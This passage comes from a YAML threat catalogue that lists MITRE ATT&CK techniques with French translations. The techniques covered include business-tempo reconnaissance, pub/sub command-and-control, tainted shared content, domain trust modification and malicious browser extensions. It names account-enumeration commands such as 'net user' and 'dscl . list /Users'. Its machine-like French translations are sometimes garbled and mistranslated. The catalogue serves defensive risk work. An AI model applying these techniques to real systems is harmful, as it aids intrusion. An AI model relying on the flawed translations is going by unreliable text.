          \ \xE9galement \xEAtre observ\xE9e peu apr\xE8s [Spearphishing interne](https://attack.mitre.org/techniques/T1534).https\_\
          ://attack.mitre.org/techniques/T1204/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1591.003
    ref_id: T1591.003
    name: Identify Business Tempo
    description: "Adversaries may gather information about the victim's business tempo\
      \ that can be used during targeting. Information about an organization\u2019\
      s business tempo may include a variety of details, including operational hours/days\
      \ of the week. This information may also reveal times/dates of purchases and\
      \ shipments of the victim\u2019s hardware and software resources.\n\nAdversaries\
      \ may gather this information in various ways, such as direct elicitation via\
      \ [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information\
      \ about business tempo may also be exposed to adversaries via online or other\
      \ accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)\
      \ or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation:\
      \ ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities\
      \ for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)\
      \ or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),\
      \ establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)\
      \ or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or\
      \ initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195)\
      \ or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))\nhttps://attack.mitre.org/techniques/T1591/003"
    translations:
      fr:
        name: Identifier le tempo des affaires
        description: "Les adversaires peuvent recueillir des informations sur le rythme\
          \ d'affaires de la victime qui peuvent \xEAtre utilis\xE9es lors du ciblage.\
          \ Les informations sur le rythme des affaires d'une organisation peuvent\
          \ inclure une vari\xE9t\xE9 de d\xE9tails, notamment des horaires ou des\
          \ jours d'op\xE9ration de la semaine. Ces informations peuvent \xE9galement\
          \ r\xE9v\xE9ler les dates/heures d'achat et d'exp\xE9dition des ressources\
          \ mat\xE9rielles et logicielles de la victime.\n\nLes adversaires peuvent\
          \ recueillir ces informations de diff\xE9rentes mani\xE8res, comme par exemple\
          \ par l'obtention directe via [Phishing for Information](https://attack.mitre.org/techniques/T1598).\
          \ Les informations sur le rythme des affaires peuvent \xE9galement \xEA\
          tre expos\xE9es aux adversaires via des ensembles de donn\xE9es en ligne\
          \ ou d'autres donn\xE9es accessibles (ex : [Social Media](https://attack.mitre.org/techniques/T1593/001)\
          \ ou [Rechercher des sites web appartenant aux victimes](https://attack.mitre.org/techniques/T1594)).\
          \ (Citation : fuite ThreatPost Broadvoice) La collecte de ces informations\
          \ peut r\xE9v\xE9ler d'autres formes de reconnaissance (ex : [Phishing for\
          \ Information](https://attack.mitre.org/techniques/T1598) ou [Rechercher\
          \ des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)),\
          \ de l'\xE9tablissement de ressources op\xE9rationnelles (ex : [\xC9tablir\
          \ des comptes](https://attack.mitre.org/techniques/T1585) ou [Compromis\
          \ des comptes](https://attack.mitre.org/techniques/T1586)), et/ou d'un acc\xE8\
          s initial (ex : [Supply Chain] Compromis](https://attack.mitre.org/techniques/T1195)\
          \ ou [Relation de confiance](https://attack.mitre.org/techniques/T1199))https://attack.mitre.org/techniques/T1591/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1071.005
    ref_id: T1071.005
    name: Publish/Subscribe Protocols
    description: "Adversaries may communicate using publish/subscribe (pub/sub) application\
      \ layer protocols to avoid detection/network filtering by blending in with existing\
      \ traffic. Commands to the remote system, and often the results of those commands,\
      \ will be embedded within the protocol traffic between the client and server.\
      \ \n\nProtocols such as <code>MQTT</code>, <code>XMPP</code>, <code>AMQP</code>,\
      \ and <code>STOMP</code> use a publish/subscribe design, with message distribution\
      \ managed by a centralized broker.(Citation: wailing crab sub/pub)(Citation:\
      \ Mandiant APT1 Appendix) Publishers categorize their messages by topics, while\
      \ subscribers receive messages according to their subscribed topics.(Citation:\
      \ wailing crab sub/pub) An adversary may abuse publish/subscribe protocols to\
      \ communicate with systems under their control from behind a message broker\
      \ while also mimicking normal, expected traffic.\nhttps://attack.mitre.org/techniques/T1071/005"
    translations:
      fr:
        name: Protocoles de publication/abonnement
        description: "Les adversaires peuvent communiquer en utilisant des protocoles\
          \ de niveau application publish/subscribe (pub/sub) afin d'\xE9viter la\
          \ d\xE9tection ou le filtrage r\xE9seau en se fondant dans le trafic existant.\
          \ Les commandes vers le syst\xE8me distant, et souvent les r\xE9sultats\
          \ de ces commandes, seront int\xE9gr\xE9es dans le trafic protocolaire entre\
          \ le client et le serveur. \n\nDes protocoles tels que <code>MQTT</code>,\
          \ <code>XMPP</code>, <code>AMQP</code>, et <code>STOMP</code> utilisent\
          \ un design publish/subscribe, avec la distribution des messages g\xE9r\xE9\
          e par un courtier centralis\xE9.( Citation : sub/pub crabe hurlant)(Citation\
          \ : Mandiant APT1 Annexe) Les \xE9diteurs cat\xE9gorisent leurs messages\
          \ par sujets, tandis que les abonn\xE9s re\xE7oivent des messages selon\
          \ leurs sujets abonn\xE9s. (Citation : sous-titre / pub crabe hurlant) Un\
          \ adversaire peut abuser des protocoles de publication/abonnement pour communiquer\
          \ avec les syst\xE8mes sous son contr\xF4le depuis l'arri\xE8re d'un courtier\
          \ de messages tout en imitant le trafic normal et attendu.https\_://attack.mitre.org/techniques/T1071/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1592.001
    ref_id: T1592.001
    name: Hardware
    description: 'Adversaries may gather information about the victim''s host hardware
      that can be used during targeting. Information about hardware infrastructure
      may include a variety of details such as types and versions on specific hosts,
      as well as the presence of additional components that might be indicative of
      added defensive protections (ex: card/biometric readers, dedicated encryption
      hardware, etc.).


      Adversaries may gather this information in various ways, such as direct collection
      actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex:
      hostnames, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).
      Adversaries may also compromise sites then include malicious content designed
      to collect host information from visitors.(Citation: ATT ScanBox) Information
      about the hardware infrastructure may also be exposed to adversaries via online
      or other accessible data sets (ex: job postings, network maps, assessment reports,
      resumes, or purchase invoices). Gathering this information may reveal opportunities
      for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),
      establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      initial access (ex: [Compromise Hardware Supply Chain](https://attack.mitre.org/techniques/T1195/003)
      or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).

      https://attack.mitre.org/techniques/T1592/001'
    translations:
      fr:
        name: "Mat\xE9riel"
        description: "Les adversaires peuvent recueillir des informations sur le mat\xE9\
          riel h\xF4te de la victime qui peuvent \xEAtre utilis\xE9es lors du ciblage.\
          \ Les informations sur l'infrastructure mat\xE9rielle peuvent inclure divers\
          \ d\xE9tails tels que des types et des versions sur des h\xF4tes sp\xE9\
          cifiques, ainsi que la pr\xE9sence de composants suppl\xE9mentaires pouvant\
          \ indiquer des protections d\xE9fensives suppl\xE9mentaires (ex. : lecteurs\
          \ de cartes/biom\xE9triques, mat\xE9riel de chiffrement d\xE9di\xE9, etc.).\n\
          \nLes adversaires peuvent recueillir ces informations de diff\xE9rentes\
          \ mani\xE8res, comme des actions de collecte directe via [Analyse active](https://attack.mitre.org/techniques/T1595)\
          \ (ex : noms d'h\xF4te, banni\xE8res serveur, cha\xEEnes d'agents utilisateurs)\
          \ ou [Phishing pour information](https://attack.mitre.org/techniques/T1598).\
          \ Les adversaires peuvent \xE9galement compromettre les sites et inclure\
          \ du contenu malveillant destin\xE9 \xE0 collecter des informations d'h\xE9\
          bergement aupr\xE8s des visiteurs. (Citation : ATT ScanBox) Les informations\
          \ sur l'infrastructure mat\xE9rielle peuvent \xE9galement \xEAtre expos\xE9\
          es aux adversaires via des ensembles de donn\xE9es en ligne ou d'autres\
          \ donn\xE9es accessibles (ex : offres d'emploi, cartes r\xE9seau, rapports\
          \ d'\xE9valuation, CV ou factures d'achat). La collecte de ces informations\
          \ peut r\xE9v\xE9ler d'autres formes de reconnaissance (ex. : [Rechercher\
          \ des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)\
          \ ou [Rechercher des bases de donn\xE9es techniques ouvertes](https://attack.mitre.org/techniques/T1596)),\
          \ l'\xE9tablissement de ressources op\xE9rationnelles (ex. : [D\xE9velopper\
          \ des capacit\xE9s](https://attack.mitre.org/techniques/T1587) ou [Obtenir\
          \ des capacit\xE9s](https://attack.mitre.org/techniques/T1588)), et/ou un\
          \ acc\xE8s initial (ex : [Compromis de l'approvisionnement mat\xE9riel]\
          \ Cha\xEEne](https://attack.mitre.org/techniques/T1195/003) ou [Ajouts mat\xE9\
          riels](https://attack.mitre.org/techniques/T1200)).https\_://attack.mitre.org/techniques/T1592/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1080
    ref_id: T1080
    name: Taint Shared Content
    description: 'Adversaries may deliver payloads to remote systems by adding content
      to shared storage locations, such as network drives or internal code repositories.
      Content stored on network drives or in other shared locations may be tainted
      by adding malicious programs, scripts, or exploit code to otherwise valid files.
      Once a user opens the shared tainted content, the malicious portion can be executed
      to run the adversary''s code on a remote system. Adversaries may use tainted
      shared content to move laterally.


      A directory share pivot is a variation on this technique that uses several other
      techniques to propagate malware when users access a shared network directory.
      It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009)
      of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036)
      to look like the real directories, which are hidden through [Hidden Files and
      Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based
      directories have an embedded command that executes the hidden malware file in
      the directory and then opens the real intended directory so that the user''s
      expected action still occurs. When used with frequently used network directories,
      the technique may result in frequent reinfections and broad access to systems
      and potentially to new and higher privileged accounts. (Citation: Retwin Directory
      Share Pivot)


      Adversaries may also compromise shared network directories through binary infections
      by appending or prepending its code to the healthy binary on the shared network
      directory. The malware may modify the original entry point (OEP) of the healthy
      binary to ensure that it is executed before the legitimate code. The infection
      could continue to spread via the newly infected file when it is executed by
      a remote system. These infections may target both binary and non-binary formats
      that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT,
      and/or .VBS.

      https://attack.mitre.org/techniques/T1080'
    translations:
      fr:
        name: "Contenu partag\xE9 de Taint"
        description: "Les adversaires peuvent livrer des charges utiles \xE0 des syst\xE8\
          mes distants en ajoutant du contenu \xE0 des emplacements de stockage partag\xE9\
          s, tels que des disques r\xE9seau ou des d\xE9p\xF4ts de code internes.\
          \ Le contenu stock\xE9 sur des disques r\xE9seau ou dans d'autres emplacements\
          \ partag\xE9s peut \xEAtre entach\xE9 par l'ajout de programmes malveillants,\
          \ scripts ou codes d'exploitation \xE0 des fichiers autrement valides. Une\
          \ fois qu'un utilisateur ouvre le contenu partag\xE9 et contamin\xE9, la\
          \ partie malveillante peut \xEAtre ex\xE9cut\xE9e pour ex\xE9cuter le code\
          \ de l'adversaire sur un syst\xE8me distant. Les adversaires peuvent utiliser\
          \ du contenu partag\xE9 contamin\xE9 pour se d\xE9placer lat\xE9ralement.\n\
          \nUn pivot de partage de r\xE9pertoire est une variante de cette technique\
          \ qui utilise plusieurs autres techniques pour propager des logiciels malveillants\
          \ lorsque les utilisateurs acc\xE8dent \xE0 un r\xE9pertoire r\xE9seau partag\xE9\
          . Il utilise [Modification de raccourci](https://attack.mitre.org/techniques/T1547/009)\
          \ du r\xE9pertoire . LNK qui utilisent [Masquerading](https://attack.mitre.org/techniques/T1036)\
          \ pour ressembler aux r\xE9pertoires r\xE9els, qui sont cach\xE9s via [Hidden\
          \ Files and Directories](https://attack.mitre.org/techniques/T1564/001).\
          \ Les malveillants. Les annuaires bas\xE9s sur LNK disposent d'une commande\
          \ int\xE9gr\xE9e qui ex\xE9cute le fichier malware cach\xE9 dans le r\xE9\
          pertoire puis ouvre le r\xE9pertoire r\xE9ellement pr\xE9vu afin que l'action\
          \ attendue de l'utilisateur se produise toujours. Lorsqu'elle est utilis\xE9\
          e avec des annuaires r\xE9seau fr\xE9quemment utilis\xE9s, la technique\
          \ peut entra\xEEner des r\xE9infections fr\xE9quentes et un acc\xE8s large\
          \ aux syst\xE8mes et potentiellement \xE0 de nouveaux comptes plus privil\xE9\
          gi\xE9s. (Citation : Pivot du partage de l'annuaire Retwin)\n\nLes adversaires\
          \ peuvent \xE9galement compromettre les annuaires r\xE9seau partag\xE9s\
          \ par des infections binaires en ajoutant ou en pr\xE9apprenant son code\
          \ au binaire sain du r\xE9pertoire r\xE9seau partag\xE9. Le malware peut\
          \ modifier le point d'entr\xE9e original (OEP) du binaire sain afin de s'assurer\
          \ qu'il est ex\xE9cut\xE9 avant le code l\xE9gitime. L'infection pourrait\
          \ continuer \xE0 se propager via le nouveau fichier infect\xE9 lorsqu'il\
          \ est ex\xE9cut\xE9 par un syst\xE8me distant. Ces infections peuvent cibler\
          \ \xE0 la fois des formats binaires et non binaires qui se terminent par\
          \ des extensions incluant, mais sans s'y limiter, .EXE, .DLL, . SCR, .BAT,\
          \ et/ou . VBS.https\_://attack.mitre.org/techniques/T1080"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1484.002
    ref_id: T1484.002
    name: Trust Modification
    description: "Adversaries may add new domain trusts, modify the properties of\
      \ existing domain trusts, or otherwise change the configuration of trust relationships\
      \ between domains and tenants to evade defenses and/or elevate privileges.Trust\
      \ details, such as whether or not user identities are federated, allow authentication\
      \ and authorization properties to apply between domains or tenants for the purpose\
      \ of accessing shared resources.(Citation: Microsoft - Azure AD Federation)\
      \ These trust objects may include accounts, credentials, and other authentication\
      \ material applied to servers, tokens, and domains.\n\nManipulating these trusts\
      \ may allow an adversary to escalate privileges and/or evade defenses by modifying\
      \ settings to add objects which they control. For example, in Microsoft Active\
      \ Directory (AD) environments, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002)\
      \ without the need to compromise the signing certificate to forge new credentials.\
      \ Instead, an adversary can manipulate domain trusts to add their own signing\
      \ certificate. An adversary may also convert an AD domain to a federated domain\
      \ using Active Directory Federation Services (AD FS), which may enable malicious\
      \ trust modifications such as altering the claim issuance rules to log in any\
      \ valid set of credentials as a specified user.(Citation: AADInternals zure\
      \ AD Federated Domain) \n\nAn adversary may also add a new federated identity\
      \ provider to an identity tenant such as Okta or AWS IAM Identity Center, which\
      \ may enable the adversary to authenticate as any user of the tenant.(Citation:\
      \ Okta Cross-Tenant Impersonation 2023) This may enable the threat actor to\
      \ gain broad access into a variety of cloud-based services that leverage the\
      \ identity tenant. For example, in AWS environments, an adversary that creates\
      \ a new identity provider for an AWS Organization will be able to federate into\
      \ all of the AWS Organization member accounts without creating identities for\
      \ each of the member accounts.(Citation: AWS RE:Inforce Threat Detection 2024)\n\
      https://attack.mitre.org/techniques/T1484/002"
    translations:
      fr:
        name: Modification de la fiducie
        description: "Les adversaires peuvent ajouter de nouveaux trusts de domaine,\
          \ modifier les propri\xE9t\xE9s des trusts de domaine existants, ou modifier\
          \ autrement la configuration des relations de confiance entre domaines et\
          \ locataires afin d'\xE9viter les d\xE9fenses et/ou d'\xE9lever des privil\xE8\
          ges. Les d\xE9tails de confiance, tels que la f\xE9d\xE9ration ou non des\
          \ identit\xE9s utilisateurs, permettent l'application de propri\xE9t\xE9\
          s d'authentification et d'autorisation entre domaines ou locataires dans\
          \ le but d'acc\xE9der aux ressources partag\xE9es. (Citation : Microsoft\
          \ - F\xE9d\xE9ration Azure AD) Ces objets de confiance peuvent inclure des\
          \ comptes, des identifiants et d'autres documents d'authentification appliqu\xE9\
          s aux serveurs, jetons et domaines.\n\nManipuler ces trusts peut permettre\
          \ \xE0 un adversaire d'escalader des privil\xE8ges et/ou d'\xE9chapper aux\
          \ d\xE9fenses en modifiant les param\xE8tres pour ajouter des objets qu'il\
          \ contr\xF4le. Par exemple, dans les environnements Microsoft Active Directory\
          \ (AD), cela peut \xEAtre utilis\xE9 pour falsifier des [jetons SAML](https://attack.mitre.org/techniques/T1606/002)\
          \ sans avoir besoin de compromettre le certificat de signature pour falsifier\
          \ de nouvelles identifiantes. \xC0 la place, un adversaire peut manipuler\
          \ les trusts de domaine pour ajouter son propre certificat de signature.\
          \ Un adversaire peut \xE9galement convertir un domaine AD en domaine f\xE9\
          d\xE9r\xE9 en utilisant Active Directory Federation Services (AD FS), ce\
          \ qui peut permettre des modifications de confiance malveillantes, telles\
          \ que la modification des r\xE8gles d'\xE9mission de r\xE9clamations pour\
          \ se connecter \xE0 un ensemble valide d'identifiants en tant qu'utilisateur\
          \ sp\xE9cifi\xE9. (Citation : AADInternals zure AD Federated Domain) \n\n\
          Un adversaire peut \xE9galement ajouter un nouveau fournisseur d'identit\xE9\
          \ f\xE9d\xE9r\xE9 \xE0 un locataire d'identit\xE9 tel qu'Okta ou AWS IAM\
          \ Identity Center, ce qui peut permettre \xE0 l'adversaire de s'authentifier\
          \ en tant qu'utilisateur du locataire. (Citation : Usurpation d'identit\xE9\
          \ entre locataires Okta 2023) Cela peut permettre \xE0 l'acteur de la menace\
          \ d'acc\xE9der largement \xE0 une vari\xE9t\xE9 de services cloud qui tirent\
          \ parti du locataire d'identit\xE9. Par exemple, dans les environnements\
          \ AWS, un adversaire qui cr\xE9e un nouveau fournisseur d'identit\xE9 pour\
          \ une organisation AWS pourra f\xE9d\xE9rer en tous les comptes membres\
          \ de l'organisation AWS sans cr\xE9er d'identit\xE9s pour chacun des comptes\
          \ membres. (Citation : AWS RE\_:Inforce Threat Detection 2024)https://attack.mitre.org/techniques/T1484/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1213.006
    ref_id: T1213.006
    name: Databases
    description: "Adversaries may leverage databases to mine valuable information.\
      \ These databases may be hosted on-premises or in the cloud (both in platform-as-a-service\
      \ and software-as-a-service environments). \n\nExamples of databases from which\
      \ information may be collected include MySQL, PostgreSQL, MongoDB, Amazon Relational\
      \ Database Service, Azure SQL Database, Google Firebase, and Snowflake. Databases\
      \ may include a variety of information of interest to adversaries, such as usernames,\
      \ hashed passwords, personally identifiable information, and financial data.\
      \ Data collected from databases may be used for [Lateral Movement](https://attack.mitre.org/tactics/TA0008),\
      \ [Command and Control](https://attack.mitre.org/tactics/TA0011), or [Exfiltration](https://attack.mitre.org/tactics/TA0010).\
      \ Data exfiltrated from databases may also be used to extort victims or may\
      \ be sold for profit.(Citation: Google Cloud Threat Intelligence UNC5537 Snowflake\
      \ 2024)\nhttps://attack.mitre.org/techniques/T1213/006"
    translations:
      fr:
        name: "Bases de donn\xE9es"
        description: "Les adversaires peuvent exploiter les bases de donn\xE9es pour\
          \ exploiter des informations pr\xE9cieuses. Ces bases de donn\xE9es peuvent\
          \ \xEAtre h\xE9berg\xE9es sur site ou dans le cloud (\xE0 la fois dans des\
          \ environnements de plateforme en tant que service et logiciel en tant que\
          \ service). \n\nParmi les exemples de bases de donn\xE9es \xE0 partir desquelles\
          \ l'information peut \xEAtre collect\xE9e, on trouve MySQL, PostgreSQL,\
          \ MongoDB, Amazon Relational Database Service, Azure SQL Database, Google\
          \ Firebase et Snowflake. Les bases de donn\xE9es peuvent inclure une vari\xE9\
          t\xE9 d'informations int\xE9ressantes pour les adversaires, telles que des\
          \ noms d'utilisateur, des mots de passe hach\xE9s, des informations personnelles\
          \ identifiables et des donn\xE9es financi\xE8res. Les donn\xE9es collect\xE9\
          es \xE0 partir de bases de donn\xE9es peuvent \xEAtre utilis\xE9es pour\
          \ [D\xE9placement lat\xE9ral](https://attack.mitre.org/tactics/TA0008),\
          \ [Commandement et Contr\xF4le](https://attack.mitre.org/tactics/TA0011)\
          \ ou [Exfiltration](https://attack.mitre.org/tactics/TA0010). Les donn\xE9\
          es exfiltr\xE9es des bases de donn\xE9es peuvent \xE9galement \xEAtre utilis\xE9\
          es pour extorquer des victimes ou \xEAtre vendues \xE0 des fins lucratives.\
          \ (Citation : Google Cloud Threat Intelligence UNC5537 Snowflake 2024)https://attack.mitre.org/techniques/T1213/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1573.001
    ref_id: T1573.001
    name: Symmetric Cryptography
    description: 'Adversaries may employ a known symmetric encryption algorithm to
      conceal command and control traffic rather than relying on any inherent protections
      provided by a communication protocol. Symmetric encryption algorithms use the
      same key for plaintext encryption and ciphertext decryption. Common symmetric
      encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.

      https://attack.mitre.org/techniques/T1573/001'
    translations:
      fr:
        name: "Cryptographie sym\xE9trique"
        description: "Les adversaires peuvent employer un algorithme de chiffrement\
          \ sym\xE9trique connu pour dissimuler le trafic de commandement et de contr\xF4\
          le plut\xF4t que de s'appuyer sur des protections inh\xE9rentes fournies\
          \ par un protocole de communication. Les algorithmes de chiffrement sym\xE9\
          trique utilisent la m\xEAme cl\xE9 pour le chiffrement du texte clair et\
          \ le d\xE9chiffrement du texte chiffr\xE9. Les algorithmes de chiffrement\
          \ sym\xE9trique courants incluent AES, DES, 3DES, Blowfish et RC4.https\_\
          ://attack.mitre.org/techniques/T1573/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1087.001
    ref_id: T1087.001
    name: Local Account
    description: 'Adversaries may attempt to get a listing of local system accounts.
      This information can help adversaries determine which local accounts exist on
      a system to aid in follow-on behavior.


      Commands such as <code>net user</code> and <code>net localgroup</code> of the
      [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and
      <code>groups</code> on macOS and Linux can list local users and groups.(Citation:
      Mandiant APT1)(Citation: id man page)(Citation: groups man page) On Linux, local
      users can also be enumerated through the use of the <code>/etc/passwd</code>
      file. On macOS, the <code>dscl . list /Users</code> command can be used to enumerate
      local accounts. On ESXi servers, the `esxcli system account list` command can
      list local user accounts.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2
      2021)

      https://attack.mitre.org/techniques/T1087/001'
    translations:
      fr:
        name: Compte local
        description: "Les adversaires peuvent tenter d'obtenir une liste des comptes\
          \ du syst\xE8me local. Ces informations peuvent aider les adversaires \xE0\
          \ d\xE9terminer quels comptes locaux existent sur un syst\xE8me afin d'aider\
          \ \xE0 la suite des comportements.\n\nDes commandes telles que <code>net\
          \ user</code> et <code>net localgroup</code> de l'utilitaire [Net](https://attack.mitre.org/software/S0039)\
          \ et <code>id</code> et <code>groupes</code> sur macOS et Linux peuvent\
          \ lister les utilisateurs et groupes locaux. (Citation : Mandiant APT1)(Citation\
          \ : id man page)(Citation : page de groupe manuelle) Sous Linux, les utilisateurs\
          \ locaux peuvent \xE9galement \xEAtre \xE9num\xE9r\xE9s via le fichier <code>/etc/passwd</code>.\
          \ Sur macOS, le <code>dscl . la commande list /Users</code> peut \xEAtre\
          \ utilis\xE9e pour \xE9num\xE9rer les comptes locaux. Sur les serveurs ESXi,\
          \ la commande 'esxcli system account list' peut lister les comptes utilisateurs\
          \ locaux. (Citation : Crowdstrike Hyperviseur Jackpotting Pt 2 2021) https://attack.mitre.org/techniques/T1087/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1586.001
    ref_id: T1586.001
    name: Social Media Accounts
    description: "Adversaries may compromise social media accounts that can be used\
      \ during targeting. For operations incorporating social engineering, the utilization\
      \ of an online persona may be important. Rather than creating and cultivating\
      \ social media profiles (i.e. [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001)),\
      \ adversaries may compromise existing social media accounts. Utilizing an existing\
      \ persona may engender a level of trust in a potential victim if they have a\
      \ relationship, or knowledge of, the compromised persona. \n\nA variety of methods\
      \ exist for compromising social media accounts, such as gathering credentials\
      \ via [Phishing for Information](https://attack.mitre.org/techniques/T1598),\
      \ purchasing credentials from third-party sites, or by brute forcing credentials\
      \ (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior\
      \ to compromising social media accounts, adversaries may conduct Reconnaissance\
      \ to inform decisions about which accounts to compromise to further their operation.\n\
      \nPersonas may exist on a single site or across multiple sites (ex: Facebook,\
      \ LinkedIn, Twitter, etc.). Compromised social media accounts may require additional\
      \ development, this could include filling out or modifying profile information,\
      \ further developing social networks, or incorporating photos.\n\nAdversaries\
      \ can use a compromised social media profile to create new, or hijack existing,\
      \ connections to targets of interest. These connections may be direct or may\
      \ include trying to connect through others.(Citation: NEWSCASTER2014)(Citation:\
      \ BlackHatRobinSage) Compromised profiles may be leveraged during other phases\
      \ of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing\
      \ via Service](https://attack.mitre.org/techniques/T1566/003)).\nhttps://attack.mitre.org/techniques/T1586/001"
    translations:
      fr:
        name: "Comptes sur les r\xE9seaux sociaux"
        description: "Les adversaires peuvent compromettre les comptes de r\xE9seaux\
          \ sociaux qui peuvent \xEAtre utilis\xE9s lors du ciblage. Pour les op\xE9\
          rations int\xE9grant l'ing\xE9nierie sociale, l'utilisation d'un persona\
          \ en ligne peut \xEAtre importante. Plut\xF4t que de cr\xE9er et cultiver\
          \ des profils sur les r\xE9seaux sociaux (c'est-\xE0-dire [Comptes de r\xE9\
          seaux sociaux](https://attack.mitre.org/techniques/T1585/001)), les adversaires\
          \ peuvent compromettre les comptes existants. L'utilisation d'une persona\
          \ existante peut susciter un certain niveau de confiance envers une victime\
          \ potentielle si elle entretient une relation, ou a connaissance de la persona\
          \ compromise. \n\nDiverses m\xE9thodes existent pour compromettre les comptes\
          \ de r\xE9seaux sociaux, telles que la collecte de cr\xE9dents via [Phishing\
          \ for Information](https://attack.mitre.org/techniques/T1598), l'achat de\
          \ r\xE9f\xE9rences aupr\xE8s de sites tiers, ou par force brute des identifiants\
          \ (ex. : r\xE9utilisation de mots de passe lors de dumps de donn\xE9es de\
          \ violation de donn\xE9es).( Citation : Anonyme (HBGary) Avant de compromettre\
          \ les comptes sur les r\xE9seaux sociaux, les adversaires peuvent effectuer\
          \ une reconnaissance pour \xE9clairer les d\xE9cisions sur les comptes \xE0\
          \ compromettre afin de poursuivre leur fonctionnement.\n\nLes personas peuvent\
          \ exister sur un seul site ou sur plusieurs sites (ex : Facebook, LinkedIn,\
          \ Twitter, etc.). Les comptes de r\xE9seaux sociaux compromis peuvent n\xE9\
          cessiter un d\xE9veloppement suppl\xE9mentaire, cela peut inclure le remplissage\
          \ ou la modification des informations de profil, le d\xE9veloppement des\
          \ r\xE9seaux sociaux ou l'int\xE9gration de photos.\n\nLes adversaires peuvent\
          \ utiliser un profil social compromis pour cr\xE9er de nouvelles connexions\
          \ existantes, ou d\xE9tourner, avec des cibles d'int\xE9r\xEAt. Ces liens\
          \ peuvent \xEAtre directs ou inclure une tentative de connexion \xE0 travers\
          \ les autres. (Citation : NEWSCASTER2014)(Citation : BlackHatRobinSage)\
          \ Les profils compromis peuvent \xEAtre exploit\xE9s lors d'autres phases\
          \ du cycle de vie de l'adversaire, comme lors de l'acc\xE8s initial (ex\
          \ : [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).https\_\
          ://attack.mitre.org/techniques/T1586/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1176.001
    ref_id: T1176.001
    name: Browser Extensions
    description: "Adversaries may abuse internet browser extensions to establish persistent\
      \ access to victim systems. Browser extensions or plugins are small programs\
      \ that can add functionality to and customize aspects of internet browsers.\
      \ They can be installed directly via a local file or custom URL or through a\
      \ browser's app store - an official online platform where users can browse,\
      \ install, and manage extensions for a specific web browser. Extensions generally\
      \ inherit the web browser's permissions previously granted.(Citation: Wikipedia\
      \ Browser Extension)(Citation: Chrome Extensions Definition) \n \nMalicious\
      \ extensions can be installed into a browser through malicious app store downloads\
      \ masquerading as legitimate extensions, through social engineering, or by an\
      \ adversary that has already compromised a system. Security can be limited on\
      \ browser app stores, so it may not be difficult for malicious extensions to\
      \ defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending\
      \ on the browser, adversaries may also manipulate an extension's update url\
      \ to install updates from an adversary-controlled server or manipulate the mobile\
      \ configuration file to silently install additional extensions. \n\nAdversaries\
      \ may abuse how chromium-based browsers load extensions by modifying or replacing\
      \ the Preferences and/or Secure Preferences files to silently install malicious\
      \ extensions. When the browser is not running, adversaries can alter these files,\
      \ ensuring the extension is loaded, granted desired permissions, and will persist\
      \ in browser sessions. This method does not require user consent and extensions\
      \ are silently loaded in the background from disk or from the browser's trusted\
      \ store.(Citation: Pulsedive)\n  \nPrevious to macOS 11, adversaries could silently\
      \ install browser extensions via the command line using the <code>profiles</code>\
      \ tool to install malicious <code>.mobileconfig</code> files. In macOS 11+,\
      \ the use of the <code>profiles</code> tool can no longer install configuration\
      \ profiles; however, <code>.mobileconfig</code> files can be planted and installed\
      \ with user interaction.(Citation: xorrior chrome extensions macOS) \n \nOnce\
      \ the extension is installed, it can browse to websites in the background, steal\
      \ all information that a user enters into a browser (including credentials),\
      \ and be used as an installer for a RAT for persistence.(Citation: Chrome Extension\
      \ Crypto Miner)(Citation: ICEBRG Chrome Extensions)(Citation: Banker Google\
      \ Chrome Extension Steals Creds)(Citation: Catch All Chrome Extension) \n\n\
      There have also been instances of botnets using a persistent backdoor through\
      \ malicious Chrome extensions for [Command and Control](https://attack.mitre.org/tactics/TA0011).(Citation:\
      \ Stantinko Botnet)(Citation: Chrome Extension C2 Malware) Adversaries may also\
      \ use browser extensions to modify browser permissions and components, privacy\
      \ settings, and other security controls for [Defense Evasion](https://attack.mitre.org/tactics/TA0005).(Citation:\
      \ Browers FriarFox)(Citation: Browser Adrozek)\nhttps://attack.mitre.org/techniques/T1176/001"
    translations:
      fr:
        name: Extensions de navigateur
        description: "Les adversaires peuvent abuser des extensions de navigateur\
          \ pour \xE9tablir un acc\xE8s persistant aux syst\xE8mes des victimes. Les\
